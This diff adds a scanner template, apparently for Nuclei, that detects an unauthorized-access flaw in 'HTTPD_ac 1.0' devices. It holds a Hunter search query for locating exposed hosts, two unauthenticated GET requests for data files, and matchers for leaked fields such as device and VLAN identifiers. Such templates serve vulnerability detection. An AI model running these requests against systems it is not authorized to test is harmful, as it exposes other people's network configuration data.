@@ -1,0 +1,28 @@
+id: POC-HTTPD-AC-Unauthorized-Data
+
+info:
+  name: HTTPD-AC1.0服务未授权漏洞
+  author: Husky
+  severity: medium
+  metadata:
+    Hunter-query: header.server=="HTTPD_ac 1.0"
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        GET /actpt.data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+      - |
+        @timeout: 30s
+        GET /zdyh.data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200 && contains_all(body_1,"ap_name","device_id","vlan_id")
+          - status_code_2==200 && contains_all(body_2,"list:","web_type",":")
